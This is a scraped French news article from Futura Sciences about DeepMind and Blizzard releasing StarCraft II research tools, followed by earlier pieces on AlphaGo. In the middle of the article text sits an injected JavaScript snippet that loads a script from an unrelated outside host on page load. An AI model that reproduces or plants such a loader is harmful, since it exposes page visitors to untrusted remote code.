{"title": "DeepMind, l'IA de Google, declare la guerre sur StarCraft II", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-08-10", "content": "DeepMind et l'editeur Blizzard viennent de publier de precieux outils. Ceux-ci permettront aux chercheurs en intelligence artificielle (IA) de creer des agents virtuels capables d'affronter les humains a armes egales au jeu de strategie StarCraft II. Ce qu'il faut retenir Pour une intelligence artificielle, un jeu de strategie en temps reel comme StarCraft II represente un defi bien plus complexe que le jeu de go. DeepMind et StarCraft ont cree des outils et une base de donnees de 65.000 parties pour les chercheurs en intelligence artificielle. Une IA capable de battre les humains a StarCraft II pourrait avoir de nombreuses applications concretes dans le monde reel. Maintenant qu'elle a definitivement demontre sa superiorite sur les humains au  jeu de go , DeepMind, la filiale de  Google  specialisee en  intelligence artificielle  (IA), s'est lancee dans un nouveau defi : battre des humains a  StarCraft  II. L'entreprise avait annonce ce nouveau programme de recherche fin 2016 et indique que des outils specifiques seraient mis a la disposition des chercheurs en  intelligence artificielle  courant 2017. C'est desormais chose faite. DeepMind et Blizzard Entertainment (editeur de ce jeu de strategie en temps reel) viennent d'annoncer la sortie d'un ensemble d'outils grace auxquels les specialistes vont pouvoir developper des agents informatiques ( bots  en anglais) capables d'affronter des joueurs humains. Pour cela, ils auront a leur disposition une interface de programmation ( API ) d'apprentissage automatique ( machine learning ) qu'ils pourront notamment utiliser dans un environnement  Linux . Une  base de donnees  de 65.000 parties anonymes est egalement a disposition pour entrainer les IA ; DeepMind prevoit de la faire grandir jusqu'a 500.000 parties dans les semaines qui viennent. Cette capture d'ecran montre une sequence d'entrainement d'une IA sur StarCraft II. Dans son commentaire, DeepMind explique que ses  bots  ont encore du mal a gerer des taches mineures, comme la collecte de mineraux ( Collect Mineral Shards ). (c) DeepMind, Blizzard                               Plus de 300 actions de base dans StarCraft II La trousse a outils de DeepMind contient aussi des miniparties qui permettent de tester les capacites d'une IA sur des actions particulieres comme la collecte de mineraux, la selection d'une unite ou le deplacement de la camera.  DeepMind  et Blizzard ont publie un article scientifique qui rend compte de leurs travaux initiaux et des premiers resultats obtenus. Celui-ci permet de constater qu'il y a encore du pain sur la planche.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  En effet, de nombreuses actions considerees comme basiques pour un joueur humain ne sont pas encore maitrisees par les  bots . Or, il existe plus de 300 actions de base possibles dans StarCraft II, sans compter leurs  declinaisons . Pour le moment, aucun agent n'est en mesure de remporter une partie complete reconnait DeepMind. C'est aussi la raison pour laquelle la filiale de Google a choisi l'ouverture a la communaute des chercheurs en IA : cela va lui permettre de progresser encore plus rapidement. Sorti en 2010, StarCraft II concentre beaucoup de complications qui representent un defi technique de taille pour une  intelligence artificielle . L'objectif principal est de battre l'adversaire, mais cela implique la reussite d'un certain nombre d'objectifs annexes comme la collecte et la gestion des ressources, la construction et l'evolution des infrastructures et des armes, l'entrainement des combattants, etc. Par ailleurs, StarCraft II est un jeu a information imparfaite. La carte geographique n'est que partiellement visible, ce qui signifie que l'IA doit developper un jeu base sur la memoire et la planification. En outre, une partie peut durer aussi bien une poignee de minutes qu'une bonne heure, ce qui veut dire que des choix strategiques decides en debut de jeu peuvent porter leurs fruits seulement a la fin du combat. Bref, la gestion de la part d'incertitude est beaucoup plus complexe. Encore 5 ans pour qu'une IA batte un humain a StarCraft II ? Des essais ont deja ete conduits avec la premiere version de StarCraft pendant des annees, mais les  logiciels  appliquaient des strategies preprogrammees et ne reposaient pas sur de l'apprentissage automatique. Les specialistes estiment qu'une intelligence artificielle performante a StarCraft II serait a meme d'accomplir des taches complexes, ce qui ouvre la voie a de nombreuses  applications  dans le monde reel. Pour Google, le succes de cette mission n'a rien de symbolique. Il menera a une monetisation de l'IA dans divers domaines. Selon  David Churchill , professeur a l'universite  Memorial  de Terre-Neuve qui a conseille DeepMind sur ce projet, il faudra cinq ans avant qu'une IA StarCraft puisse battre un humain. Rappelons qu'un an avant la premiere victoire de l'IA Alpha Go contre un humain, les experts n'imaginaient pas un tel scenario avant au moins une decennie. DeepMind les fera-t-elle mentir a nouveau ? A suivre... Pour en savoir plus DeepMind, l'IA de Google, va s'attaquer a StarCraft II Article initial de  Marc Zaffagni , paru le 7/11/2016 Apres le jeu de go, DeepMind, la filiale de Google, compte entrainer son intelligence artificielle pour vaincre au jeu de strategie en temps reel StarCraft II. Un defi technique encore plus releve qui est susceptible d'offrir a une IA des competences precieuses pour accomplir des taches de la vie reelle. Comme elle l'avait annonce il y a quelques mois apres la victoire retentissante de son intelligence artificielle (IA) contre le champion du jeu de go, la societe DeepMind va desormais s'interesser au jeu video StarCraft II. A l'occasion de la conference annuelle de Blizzard Entertainment, l'editeur de ce titre de strategie en temps reel qui voit des joueurs professionnels s'affronter dans le monde entier,  DeepMind  a officialise un nouveau programme de recherche. Il vise a creer une plateforme ouverte a tous les chercheurs qui voudront developper une IA capable de battre un joueur humain. Le defi s'annonce encore plus complexe qu'il le fut pour le go. En effet, dans ce jeu, l'IA avait une vision complete du jeu de l'adversaire sur le plateau. Ce n'est pas le cas dans StarCraft ou d'autres jeux de strategie en temps reel dans lesquels les joueurs ne voient pas ce que fait leur rival. Chacun doit a la fois gerer ses ressources, mener des missions de reconnaissance et developper des tactiques offensives et defensives. << Les competences requises pour qu'un agent  [une IA,  NDLR ]  puisse progresser dans l'environnement et jouer a StarCraft pourraient a terme etre appliquees a des taches de la vie reelle >> , explique DeepMind. De son cote, Blizzard Entertainment compte sur ce projet pour faire progresser l'intelligence artificielle de son jeu phare et vraisemblablement celle de ses titres a venir. Voici a quoi ressemblera l'interface graphique simplifiee de StarCraft II mise a disposition des chercheurs par Blizzard Entertainment et DeepMind. L'objectif est de fournir des donnees visuelles afin que les IA apprennent a jouer sur les memes bases que les humains. (c) DeepMind  Une plateforme ouverte a tous les chercheurs en intelligence artificielle Debut 2017, DeepMind et Blizzard vont mettre a disposition des chercheurs en IA un environnement de travail sur StarCraft II avec une interface graphique simplifiee plus adaptee aux systemes d'apprentissage automatique accompagnee d'une API (interface de programmation). Par ailleurs, Blizzard fournira des enregistrements de parties de StarCraft II qui viendront alimenter une base de donnees dans lesquelles les IA pourront puiser pour apprendre a jouer a partir d'informations visuelles, exactement comme un humain. Malgre le succes rencontre avec le jeu de go, DeepMind estime que le projet StarCraft est encore plus ambitieux. La filiale de Google ne s'est d'ailleurs pour le moment pas avancee a defier un joueur professionnel. Mais rappelons que peu de temps avant la victoire d' AlphaGo  (l'IA developpee par DeepMind) face a un joueur de go, les meilleurs specialistes en IA estimaient qu'il faudrait encore une decennie pour parvenir a un tel resultat... Apres sa victoire au jeu de go, l'IA de Google pense aux jeux video Article initial de Marc Zaffagni, paru le 15/03/2016 Lors du cinquieme et dernier match de jeu de go qui s'est avere tres dispute,  AlphaGo  l'a finalement emporte face au champion sud-coreen Lee Sedol. Avec quatre victoires, le programme d'intelligence artificielle a demontre ses formidables capacites. Quel sera son prochain defi ? Peut-etre se confronter a un jeu video de strategie comme StarCraft. Quatrieme victoire pour  AlphaGo  face a Lee Sedol. La derniere partie de ce tournoi de go mettant aux prises l'Homme et la machine a tenu ses promesses. Apres la victoire de  Lee Sedol  lors du quatrieme match, le rapport de force semblait plus equilibre. En effet, cet ultime affrontement qui s'est joue en 280 coups s'est avere serre et tres intense. AlphaGo a commis une erreur en debut de partie mais il a reussi a redresser la situation. Les deux opposants n'ont rien lache. Cependant, AlphaGo s'est octroye un leger avantage aux points qui a conduit Lee Sedol a jeter l'eponge. L' intelligence artificielle  (IA) developpee par la societe britannique DeepMind (filiale de Google) s'est donc adjuge quatre victoires en cinq parties. Le prix d'un million de dollars qui etait en jeu sera reverse a l'Unicef, des oeuvres de charite et des associations de jeu de go. Lors de la conference de presse d'apres-match, Lee Sedol s'est dit ravi de cette experience. Il a explique que, d'apres lui, le plus grand avantage que possedait AlphaGo etait d'ordre psychologique. Contrairement a un joueur humain, la machine n'est pas sujette aux emotions ; elle n'est pas impressionnee par les enjeux et son niveau de concentration n'est pas susceptible de varier au cours de la partie.  Le champion sud-coreen a estime que la creativite et l'aspect psychologique sont deux domaines dans lesquels les humains ont une marge de progression qui peut leur laisser une chance de battre une intelligence artificielle au jeu de go.  << Je ne pense pas qu'AlphaGo soit superieure a moi. Je crois qu'un humain peut faire plus face a une intelligence artificielle, a commente Lee Sedol. Ma defaite n'est pas une defaite de l'humanite. Cela a montre mes propres faiblesses, pas celles de l'humanite >>.  Lee Sedol vient d'abandonner la partie dans le cinquieme et dernier match qui l'opposait a l'intelligence artificielle AlphaGo. (c) DeepMind, YouTube                               AlphaGo pourrait jouer a StarCraft Reste que la domination d'AlphaGo est sans appel et qu'elle a fait franchir un cap decisif a l'IA. Quelle sera la prochaine etape ? Interroge a ce sujet, Demis Hassabis, le patron de DeepMind, a evoque la possibilite d'organiser d'autres tournois de go contre des joueurs de haut niveau. Il pourrait s'agir de Ke Jie, un jeune prodige chinois de 18 ans qui est actuellement numero 1 mondial. Il est egalement question de rendre AlphaGo disponible pour le grand public mais ce n'est pas tout... Lors d'un entretien avec le site  The Verge , Demis Hassabis a cite la possibilite d'organiser une confrontation Homme-machine autour du jeu video StarCraft. Ce jeu de strategie sorti en 1998 qui est l'une des references du genre pourrait representer un defi peut-etre encore plus complexe que celui qu'AlphaGo vient de relever.  En effet, le go est un jeu dit a information parfaite, ou les joueurs ont une vision complete du jeu de l'adversaire sur le plateau. Dans un jeu comme StarCraft, chaque joueur developpe sa strategie offensive et defensive sans voir ce que fait l'adversaire. Il y a donc une part d'incertitude qui rend la prise de decision plus difficile et imprevisible. Il serait donc tout a fait interessant d'observer comment une intelligence artificielle se comporterait dans ces conditions.  Pour Demis Hassabis, qui fut lui-meme un developpeur de jeux video repute, l'objectif n'est pas de faire << jouer >> une IA juste pour relever des defis.  << Bien que cela soit amusant et enthousiasmant, le but de DeepMind n'est pas juste de gagner a des jeux  [...]  Il faut qu'ils soient utiles en tant que banc d'essai, une plateforme pour essayer nos algorithmes, tester jusqu'ou ils peuvent aller >> . A terme, l'idee de DeepMind et de  Google  est bel et bien d'exploiter les capacites d'une intelligence artificielle dans divers domaines concrets. A plusieurs reprises, Demis Hassabis a cite la sante, la science, la  robotique  et les assistants virtuels pour  smartphones  comme les debouches les plus evidents.  << A l'heure actuelle, a peu pres tous les assistants de  smartphones  sont preprogrammes et cela signifie qu'ils sont fragiles car ils ne peuvent faire que les choses pour lesquelles ils ont ete preprogramme >> . Il pense que d'ici quatre a cinq ans, les  assistants virtuels  vont devenir beaucoup plus adaptatifs sous l'influence d'une IA qui apprendra en temps reel et saura mieux s'adapter a un contexte.  La science est un autre domaine dans lequel le fondateur de DeepMind voit beaucoup de promesses.  << J'aimerais voir une science ou une IA serait un assistant de recherche faisant tout le travail fastidieux de trouver des articles interessants, d'identifier une structure dans une vaste quantite de donnees pour les faire remonter aux experts humains et aux scientifiques qui pourraient avancer plus rapidement >> . Cependant, tout ceci va prendre encore beaucoup de temps avant d'aboutir. La victoire d'AlphaGo n'est pas un aboutissement pour l'intelligence artificielle, c'est plutot un commencement.  Playlist : tout savoir sur le transhumanisme, la robotique et l'intelligence artificielle                       Jean-Claude Heudin, directeur de l'IIM (institut de l'Internet et du multimedia) nous parle de sa vision du transhumanisme, du futur de l'intelligence artificielle et des robots durant cette serie d'interviews reunies sous forme de playlist.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  jeux starcraft  |  comment attaquer site web", "theme": "tech"}